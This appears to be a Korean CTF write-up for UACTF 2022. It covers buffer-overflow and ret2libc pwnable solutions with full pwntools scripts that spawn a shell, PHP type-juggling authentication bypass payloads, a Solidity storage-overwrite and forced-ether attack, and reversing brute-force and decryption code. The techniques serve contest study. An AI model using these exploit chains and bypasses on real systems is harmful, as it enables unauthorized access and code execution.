---
layout: post
title: UACTF 2022 write-up
date: 2022-08-06 09:00:00 +0900
categories: [Security, CTF]
tags: [CTF, linux]
media_subpath: /assets/img/
---

![rank](0806-uactf-writeup/01-rank.png)
*리버싱이랑 포렌식, 그리고 미스크에 진심이었던 CTF였다고 생각한다.*

내가 푼 거에 대해서만 라이트업을 써 보려고 한다.

## **Pwnable**
### **something something win**

- Arch : amd64-64-little
- RELRO : <span style="color: #ffd33d">Partial RELRO</span>
- Stack : <span style="color: red">No Canary found</span>
- NX : <span style="color: #008000">NX enabled</span>
- PIE : <span style="color: red">No PIE (0x400000)</span>

```c
void __cdecl sussy()
{
  char buffer[16]; // [rsp+0h] [rbp-20h] BYREF
  uint64_t check2; // [rsp+10h] [rbp-10h]
  uint64_t check1; // [rsp+18h] [rbp-8h]

  check1 = 0LL;
  check2 = 0LL;
  *(_QWORD *)buffer = 0LL;
  *(_QWORD *)&buffer[8] = 0LL;
  puts("Yeah, I've made it impossible to hack, you know me");
  read(0, buffer, 0x30uLL);
  if ( check1 != 0x539 )
    exit(-1);
  if ( check2 != 1337 )
    exit(-1);
  puts("Hmm, did you do it?");
}
```
buffer에서 BOF가 발생하고, 이를 바탕으로, check1과 check2의 값을 적절히 덮어써서 조건문을 우회한 뒤 RIP를 조작하는 문제이다. 플래그를 읽고 출력하는 `win` 함수를 주기 때문에, 이를 이용하자.

```python
from pwn import *
p = process('./something-something-win')
win = 0x401216
payload = b'A'*0x10 + p64(1337) * 3 + p64(win)
p.sendafter(b"me\n", payload)
p.interactive()
```



### **warmup**
- Arch : amd64-64-little
- RELRO : <span style="color: #ffd33d">Partial RELRO</span>
- Stack : <span style="color: red">No Canary found</span>
- NX : <span style="color: #008000">NX enabled</span>
- PIE : <span style="color: red">No PIE (0x400000)</span>
```c
int __cdecl check1()
{
  puts("Enter the pincode: ");
  __isoc99_scanf("%lu");
  return 0;
}
```
check1 함수의 수행 결과가 참이 되게 하면, puts의 libc 주소를 주면서 BOF가 발생해 ROP를 할 수 있다.

```
.text:00000000004011DF                 movsd   xmm0, [rbp+input]
.text:00000000004011E4                 movsd   xmm1, [rbp+input]
.text:00000000004011E9                 ucomisd xmm0, xmm1
.text:00000000004011ED                 setp    al
.text:00000000004011F0                 mov     edx, 1
.text:00000000004011F5                 ucomisd xmm0, xmm1
.text:00000000004011F9                 cmovnz  eax, edx
.text:00000000004011FC                 movzx   eax, al
.text:00000000004011FF                 leave
.text:0000000000401200                 retn
```

이게 디컴파일된 코드만 보면 불가능해 보이지만, 어셈블리 코드로 살펴보면, `setp al`이 al 레지스터에 Parity bit(PF) 값이 참이면 al 레지스터도 세팅된다. 이후에, al 레지스터의 값이 그대로 반환되는 것을 확인할 수 있다.

따라서, ___isoc99_scanf 함수의 수행 결과로 EFLAGS 레지스터에 PF만 세팅될 수 있으면, 참 값을 반환할 수 있다.

PF는 연산 수행 결과로, 1로 세팅된 비트의 수가 짝수일 때 1로 세팅되고, 그렇지 않으면 0이라고 하는데... scanf 루틴에 따라 이 값이 어떻게 달라지는지는 잘 모른다. 나중에 EFLAGS 관련해서 정리 좀 해야겠다 ㅠㅠ.

그러나, 음수를 입력하니까 PF가 세팅되어, 조건문을 우회할 수 있음을 알게 되었고, 이를 바탕으로 익스플로잇 코드를 작성하였다.

```python
from pwn import *

p = process('./warmup')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so', False)

p.sendlineafter(b": \n", str(-1).encode())
p.recvuntil(b"0x")
libc.address = int(p.recvline()[:-1], 16) - libc.symbols['puts']
success("libc base @ " +hex(libc.address))

payload = b'A'*0x38
payload += p64(0x401255) # pop rdi; ret
payload += p64(list(libc.search(b"/bin/sh"))[0])
payload += p64(0x401256) # ret
payload += p64(libc.symbols['system'])
p.send(payload)

p.interactive()
```

### **no no square**

- Arch : amd64-64-little
- RELRO : <span style="color: #ffd33d">Partial RELRO</span>
- Stack : <span style="color: red">No Canary found</span>
- NX : <span style="color: #008000">NX enabled</span>
- PIE : <span style="color: red">No PIE (0x400000)</span>


```c
void __cdecl super_duper_safe()
{
  char buffer[40]; // [rsp+0h] [rbp-30h] BYREF

  puts("This is going to be fun... is it?");
  read_buffer(buffer, 0x80uLL);
  puts("Did you have fun?");
}

void __cdecl read_buffer(char *b, size_t sz)
{
  char c; // [rsp+1Bh] [rbp-5h]
  int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; sz > i; ++i )
  {
    c = getchar();
    if ( !check_square(c) )
    {
      puts("no no no");
      return;
    }
    b[i] = c;
  }
}

char no_no_square[2] = {0x0A, 0xA8};
bool __cdecl check_square(char c)
{
  unsigned int i; // [rsp+10h] [rbp-4h]

  for ( i = 0; i <= 1; ++i )
  {
    if ( c == no_no_square[i] )
      return 0;
  }
  return 1;
}
```

`super_duper_safe` 함수에서 BOF가 발생하고, 이때, payload에 0x0A와 0xA8에 해당하는 값만 넣지 않으면 되는 문제이다. 나의 경우에는 `puts@plt(puts@got)` 호출하고, 다시 `super_duper_safe` 함수 호출한 뒤, `system("/bin/sh")`를 실행했는데, 이 과정에서 딱히 조건에 걸릴만한 것이 없었다.

```python
from pwn import *

p = process('./nonosquare')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so', False)

puts_plt = 0x401060
puts_got = 0x404018
pop_rdi = 0x0000000000401343
super_duper_safe = 0x401247
ret = 0x40127E

payload = b'A'*0x38
payload += p64(pop_rdi) + p64(puts_got)
payload += p64(puts_plt)
payload += p64(super_duper_safe)
payload += b'A'* (0x80 - len(payload))
p.sendafter(b"it?\n", payload)
p.recvuntil(b"?\n")
libc.address = u64(p.recv(6) + b'\x00\x00') - libc.symbols['puts']
success("libc base @ " + hex(libc.address))

payload2 = b'A'*0x38
payload2 += p64(pop_rdi) + p64(list(libc.search(b"/bin/sh"))[0])
payload2 += p64(ret)
payload2 += p64(libc.symbols['system'])
payload2 += b'A' * (0x80 - len(payload2))
p.sendafter(b"it?\n", payload2)
p.interactive()
```

## **Web**
### **Trial by PHP**

robots.txt에 접근할 경우, php 파일 명(secret-source.php)을 확인할 수 있고, 이를 다운받을 수 있었다.

```php
...
    <?php
        $egg = (hash_hmac("md5", $_COOKIE["egg"], "DEADLYDRAGON") == 0);
        $deep = isset($_GET["deep"]) && (strlen(base64_encode(abs($_GET["deep"]))) < strlen($_GET["deep"]));
        $hedge = isset($_GET["THROUGH_A_TRAP_LADEN_MAZE"]) && (strpos(urldecode($_SERVER['QUERY_STRING']), "_") === false);
    ?>

    <main>
        ...
    </main>
```

세 개의 조건문을 우회하면 플래그를 제공하는 문제이다.

1. `hash_hmac(string $algo, string $data, string $key, bool $binary = false): string`

    `$data`의 값에 array가 전달될 경우, `hash_hmac` 함수의 return 값은 항상 NULL이다.
    따라서, `$_COOKIE["egg"]`를 배열로 세팅하여 전송하면 된다.

2. `base64_encode(abs($_GET["deep"]))`

    일반적으로, base64 인코딩한 것이 원본 메시지의 길이보다 길거나 같을 수밖에 없다. base64 인코딩에서 3바이트 단위로 부족하면 0을 패딩하기 때문이다.

    그런데, abs 함수로 인해 그것의 값이 달라지게 된다. (e.g. 00000 -> 0, ----9 -> 9, 1.00000 -> 1)

    이러한 성질을 이용하면, 조건문을 우회할 수 있다.

3. `strpos(urldecode($_SERVER['QUERY_STRING']), "_")`

    서버로 전달되는 Query string에서 '_'가 없이 `THROUGH_A_TRAP_LADEN_MAZE`를 표현하면 되는 문제이다.

    PHP에서는 외부에서 입력된 변수 명 내에 일부 문자(' ', '.', '[', chr(128), ...)를 강제로 언더바(_)로 치환하는 특징이 있다. 이를 이용해서, 변수 명을 우회하면 된다.

    [참고](https://www.php.net/variables.external)

payload : 
```
GET
http://challenges.uactf.com.au:30006/?deep=-----9&THROUGH.A.TRAP.LADEN.MAZE=1
'Cookie: egg[]=1'
```

### **Juggler**
```php
            if (!empty($_POST['username']) && !empty($_POST['password']) &&
                !empty($_POST['hmac']) && !empty($_POST['nonce']))
            {
                $secret = hash_hmac('sha256', $_POST['nonce'], $secret);
                $hmac = hash_hmac('sha256', $_POST['username'], $secret);

                if (strcmp($_POST['username'], "admin") == 0 &&
                    strcmp($_POST['password'], $password) == 0 &&
                    $_POST['hmac'] === $hmac)
                    echo "<p style='color:green'>Login successful! Here is your flag: {$flag}</p>";
```

![arg1](0806-uactf-writeup/02-juggler1.png)
*username\[\]=1&password\[\]=1&hmac=1&nonce=c97...*

username와 password 인자를 배열로 만들 경우, strcmp가 항상 0이 된다.

그러나, username을 배열로 만들었을 때의 단점은 `$hmac`이 NULL이 된다는 것이고, `$hmac`이 NULL이 되는 순간, `$_POST['hmac']`는 NULL이지만 NULL이 아니어야 하는 양자역학 같은 상태가 되어야 하기에 익스가 어려워 보인다.  
(`empty($_POST['hmac'])`은 참이면서, `$_POST['hmac']`은 NULL이어야 하기 때문이다.)

![arg2](0806-uactf-writeup/03-juggler2.png)
*username=admin&password\[\]=1&hmac=1&nonce\[\]=c97...*

공격자는 username이 admin이면 되니까, password만 배열로 만든다면? 여전히 두 개의 조건을 통과할 수 있다.

추가로, nonce가 배열이 되면, 이전에 언급했듯이, `$secret`이 어떤 값이 되더라도?  
`hash_hmac('sha256', $_POST['nonce'], $secret)`는 NULL을 반환하기 때문에, `$secret`은 NULL이 되고, 결국 `$hmac`은 hash_hmac('sha256', 'admin', NULL)이 된다.

![request body](0806-uactf-writeup/04-body.png)
*username=admin&password\[\]=1&hmac={$right_hmac}&nonce\[\]=c97...*

```
FLAG : UACTF{jugg1e_this_y0u_fi1thy_casua1}
```

### **Totally Secure Dapp**

```solidity
pragma solidity 0.4.24;

contract TotallySecureDapp is Initializable {
    struct Post {
        string title;
        string content;
    }

    string public _contractId;
    address public _owner;
    address[] public _authors;
    Post[] public _posts;
    bool public _flagCaptured;

    ...

    function editPost(
        uint256 index,
        string title,
        string content
    ) external {
        _authors[index] = msg.sender;
        _posts[index] = Post(title, content);
        emit PostEdited(msg.sender, index);
    }

    function removePost(uint256 index) external {
        if (int256(index) < int256(_posts.length - 1)) {
            for (uint256 i = index; i < _posts.length - 1; i++) {
                _posts[i] = _posts[i + 1];
                _authors[i] = _authors[i + 1];
            }
        }
        _posts.length--;
        _authors.length--;
        emit PostRemoved(msg.sender, index);
    }

    function captureFlag() external onlyOwner {
        require(address(this).balance > 0.005 ether, 'Balance too low');
        _flagCaptured = true;
        emit FlagCaptured(msg.sender);
    }

    function() external payable {
        revert('Contract does not accept payments');
    }
```
먼저, 이 문제의 쟁점은 두 가지이다.

1. `_owner`를 공격자의 것으로 돌릴 수 있느냐
2. TotallySecureDapp Contract의 계좌에 0.005 ether 이상의 돈을 보낼 수 있느냐

첫 번째는 `removePost` 함수 내부에서 `_authors.length`를 강제로 음수로 만들고, 이후에 Solidity에서의 Dynamic array의 위치를 고려하여 index를 계산한 뒤, `editPost` 함수를 이용해, `_owner`를 사용자의 address로 덮어버리면 된다.

이 문제를 풀다 보면, keccak256(uint256(2)) slot에 _authors의 실제 값이 들어간다고 착각하기 쉽고([참고](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/)), 이 때문에 삽질을 좀 할 수 있다. 그러나, `TotallySecureDapp` Contract가 `Initializable` Contract를 상속하고 있으며, 이로 인해, `Initializable` Contract의 변수도 고려해야 하는 상황에 이른다. `Initializable` Contract의 변수는 boolean 타입의 변수를 2개 가지고 있고, 이는 1바이트에 불과하므로, 0번째 슬롯에 정렬되게 된다. 

그러면, _contractId는 1번째 슬롯, _owner는 2번째 슬롯, _authors.length는 3번째 슬롯에, _authors의 실제 값은 keccak256(3) slot에 있다는 것을 알 수 있다. 그렇다면, 다음과 같이 함수 호출을 진행할 경우, _owner가 공격자의 지갑 주소로 덮여질 것이다.

```
removePost(0)
editPost(2 + 2^256 - keccak256(uint256(3))
```

두 번째는 fallback 함수에서 revert를 발생시킬 때, 스마트 컨트랙트의 계좌에 돈을 전송하는 방법인데, 이는 방벙비 여러 개가 있지만, selfdestruct 함수를 이용하는 것이 가장 쉬운 것 같다.

다음과 같은 Contract를 배포한다.

```solidity
pragma solidity 0.4.24;

contract Test{
  address private owner=... ;//문제 계좌
  uint public c=0;

  function getEther() payable{

  }

  function destruct() public payable{
    selfdestruct(owner);
  }
}
```

이후에, getEther 함수를 통해, 해당 컨트랙트의 계좌에 돈을 송금하고, destruct 함수를 호출하여, 문제 컨트랙트의 계좌에 돈을 강제로 송금할 수 있다.

이 두 가지 방법을 이용해, `_flagCaptured`를 True로 만들 수 있다.

그리고, `/api/secret`의 Body에 userAddress와 contractAddress, userId를 전송해서 플래그를 받을 수 있는데, userId가 서버에서 발행해주는 값이라서 뭔지 모른다.

이에 대한 힌트가 `components/connector/ConnectModal.tsx`에 나와 있고, 이를 재발행하려면, `/api/contract/{$usrAddr}`을 접속하면 된다. 그렇게 얻은 contractAddress에 공격을 다시 수행하고, userId와 함께 재인증하면 플래그를 획득할 수 있다.

![flag](0806-uactf-writeup/05-flag.png)


## **Reversing**
### **Mason**

플래그를 4글자씩 떼와서, srand 함수의 인자로 넣어, 이를 바탕으로 숫자를 뽑아내 출력해준다.

즉, 출력된 숫자를 이용해 브루트포싱을 진행하여 4글자를 구할 수 있는 것이다.

C언어를 이용해, 출력된 숫자들을 저장해서, 총 6번 노가다를 했고, 전체 플래그를 구할 수 있었다.

```c
#include <stdio.h>
#include <stdlib.h>
char buf[0x100];
char strSet[0x60];
int flag()
{
    int cnt = 0;
    for(int i=0x20; i< 0x81; ++i)
        strSet[cnt++] = i;
    strSet[cnt] = '\0';
}

int getRand(int target)
{
    return (rand() % 0x1000000 == target);
}

int main()
{
    flag();
    unsigned int res0[] = {1, 9022031, 12357936, 2415318, 16184558};
    unsigned int res1[] = {4, 15675668, 8500099, 9806299, 14221377, 270945};
    unsigned int res2[] = {4, 2435548, 15557382};
    unsigned int res3[] = {4, 3275420, 8669577};
    unsigned int res4[] = {4, 13841399, 11338655};
    unsigned int res5[] = {0, 1733558, 13535810};
    unsigned int res[] = {2, 4556352, 9209045};

    for(int i=0; i<0x60; ++i) {
        printf("[*] i: %d\n", i);
        buf[0] = strSet[i];
        for (int j=0; j<0x60; ++j) {
            buf[1] = strSet[j];
            for (int k=0; k<0x60; ++k) {
                buf[2] = strSet[k];
                for (int l=0; l<0x60; ++l) {
                    buf[3] = strSet[l];
                    srand(*(int *)&buf[0]);
                    if (rand() % 6 == res[0] && getRand(res[1]) && getRand(res[2])) {
                        printf("[*] %s\n", buf);
                        return 0;
                    }
                }
            }
        }
    }
}

```

### **Rational**

encoder는 `argv[1]`에 해당하는 파일을 가져와서, 암호화를 수행한 뒤, 이를 "encoded.enc" 파일로 쓴다. 

암호화 로직은 다음과 같다.
```c
unsigned __int64 __fastcall sub_1249(char *ptr, unsigned __int64 size)
{
	for (int i=0; i >= size ; ++i)
	{
		if (A >= B)
		{
			if (A > B)
			{
				int val = 0;
				while (A >= B)
				{
					A -= B;
					++val;
				}
				A *= 10;
				ptr[i] += val;
			}
		}
		else
			A *= 10;
	}
}
```
A(0x4010) = 0x1FA2  
B(0x4014) = 0x27D

여기서 입력되는 `ptr`은 원본 파일이며, `size`는 원본 파일의 크기이다. 따라서, 암호화된 파일이랑 원본 파일이랑 크기가 같으며, 단순히 연산을 수행해 원본 파일에 값을 더하는 것밖에 하지 않는다. 이러한 것의 역연산은 단순히 같은 값을 빼면 되는 것이다.

복호화는 다음과 같다.

```c
#include <stdio.h>
#define SIZE 0x4b5b8
int A = 0x1FA2;
int B = 0x27D;
char ptr[SIZE];
char buf[SIZE];
int main()
{
    int size = SIZE;
	for (int i=0; i < size ; ++i)
	{
		if (A >= B)
		{
			if (A > B)
			{
				int val = 0;
				while (A >= B)
				{
					A -= B;
					++val;
				}
				A *= 10;
				ptr[i] += val;
			}
		}
		else
			A *= 10;
	}
    FILE *fd = fopen("encoded.txt", "rb");
    if (!fd)
    {
        printf("open error\n");
        return 0;
    }

    fread(buf, 1, size, fd);
    for (int i=0; i < size; ++i)
        buf[i] -= ptr[i];

    FILE *fd2 = fopen("input_file", "wb");
    fwrite(buf, 1, size, fd2);
    fclose(fd);
    fclose(fd2);
    return 0;
}
```

이를 통해, input_file이 만들어지는데, 이 파일이 UPX 패킹되어 있다는 것을 쉽게 확인할 수 있다.

![upx](0806-uactf-writeup/06-upx.png)

UPX unpacker를 돌려도 안 돌려도 어차피 실행 로직은 같아서 플래그가 보이는 건 똑같긴 하다.

![flag](0806-uactf-writeup/07-flag.png)